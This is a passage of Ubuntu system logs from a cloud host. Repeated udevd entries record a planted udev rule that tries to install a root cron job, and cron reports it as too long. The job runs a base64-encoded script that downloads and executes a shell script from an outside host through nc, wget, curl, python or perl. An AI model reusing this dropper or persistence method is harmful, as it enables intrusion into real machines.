nQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:23:26 ip-172-31-23-190 networkctl[19973]: Interface "veth3fb9667" not found.
+Feb 08 23:23:26 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19973, but reception only permitted for main PID 614
+Feb 08 23:23:26 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19973, but reception only permitted for main PID 614
+Feb 08 23:23:27 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20030, but reception only permitted for main PID 614
+Feb 08 23:23:27 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20037, but reception only permitted for main PID 614
+Feb 08 23:23:47 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20219, but reception only permitted for main PID 614
+Feb 08 23:23:47 ip-172-31-23-190 networkctl[20222]: Interface "veth4010cfa" not found.
+Feb 08 23:23:47 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20222, but reception only permitted for main PID 614
+Feb 08 23:23:47 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20222, but reception only permitted for main PID 614
+Feb 08 23:23:47 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:23:47 ip-172-31-23-190 networkctl[20225]: Interface "veth3480fdf" not found.
+Feb 08 23:23:47 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20225, but reception only permitted for main PID 614
+Feb 08 23:23:47 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20225, but reception only permitted for main PID 614
+Feb 08 23:23:47 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20277, but reception only permitted for main PID 614
+Feb 08 23:23:47 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20283, but reception only permitted for main PID 614
+Feb 08 23:24:01 ip-172-31-23-190 cron[659]: Error: command too long; while reading /etc/cron.d/auto-upgrade
+Feb 08 23:24:08 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20453, but reception only permitted for main PID 614
+Feb 08 23:24:08 ip-172-31-23-190 networkctl[20456]: Interface "veth1f92f51" not found.
+Feb 08 23:24:08 ip-172-31-23-190 networkctl[20459]: Interface "veth4c57839" not found.
+Feb 08 23:24:08 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20459, but reception only permitted for main PID 614
+Feb 08 23:24:08 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20459, but reception only permitted for main PID 614
+Feb 08 23:24:08 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:24:08 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20512, but reception only permitted for main PID 614
+Feb 08 23:24:08 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20518, but reception only permitted for main PID 614
+Feb 08 23:24:28 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20686, but reception only permitted for main PID 614
+Feb 08 23:24:28 ip-172-31-23-190 networkctl[20689]: Interface "veth33a6a70" not found.
+Feb 08 23:24:28 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20689, but reception only permitted for main PID 614
+Feb 08 23:24:28 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20689, but reception only permitted for main PID 614
+Feb 08 23:24:28 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:24:28 ip-172-31-23-190 networkctl[20692]: Interface "veth82d56d5" not found.
+Feb 08 23:24:28 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20692, but reception only permitted for main PID 614
+Feb 08 23:24:28 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20692, but reception only permitted for main PID 614
+Feb 08 23:24:29 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20743, but reception only permitted for main PID 614
+Feb 08 23:24:29 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20749, but reception only permitted for main PID 614
+Feb 08 23:24:49 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20920, but reception only permitted for main PID 614
+Feb 08 23:24:49 ip-172-31-23-190 networkctl[20923]: Interface "vethc73960f" not found.
+Feb 08 23:24:49 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20923, but reception only permitted for main PID 614
+Feb 08 23:24:49 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20923, but reception only permitted for main PID 614
+Feb 08 23:24:49 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:24:49 ip-172-31-23-190 networkctl[20926]: Interface "vethf5c1ca4" not found.
+Feb 08 23:24:49 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20926, but reception only permitted for main PID 614
+Feb 08 23:24:49 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20926, but reception only permitted for main PID 614
+Feb 08 23:24:49 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 20984, but reception only permitted for main PID 614
+Feb 08 23:25:01 ip-172-31-23-190 cron[659]: Error: command too long; while reading /etc/cron.d/auto-upgrade
+=== RECENT PACKAGE ACTIVITY ===
+ubuntu@ip-172-31-23-190:~$
